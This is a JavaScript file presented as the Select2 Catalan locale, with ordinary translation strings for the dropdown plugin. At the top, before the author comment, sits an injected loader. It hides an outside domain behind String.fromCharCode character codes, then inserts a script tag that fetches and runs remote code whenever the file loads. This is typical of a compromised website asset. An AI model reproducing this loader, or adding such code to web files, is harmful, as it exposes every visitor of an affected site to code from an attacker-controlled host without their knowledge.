var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Catalan translation.
 * 
 * Author: David Planella <david.planella@gmail.com>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['ca'] = {
        formatNoMatches: function () { return "No s'ha trobat cap coincidència"; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "Introduïu " + n + " caràcter" + (n == 1 ? "" : "s") + " més"; },
        formatInputTooLong: function (input, max) { var n = input.length - max; return "Introduïu " + n + " caràcter" + (n == 1? "" : "s") + "menys"; },
        formatSelectionTooBig: function (limit) { return "Només podeu seleccionar " + limit + " element" + (limit == 1 ? "" : "s"); },
        formatLoadMore: function (pageNumber) { return "S'estan carregant més resultats…"; },
        formatSearching: function () { return "S'està cercant…"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['ca']);
})(jQuery);
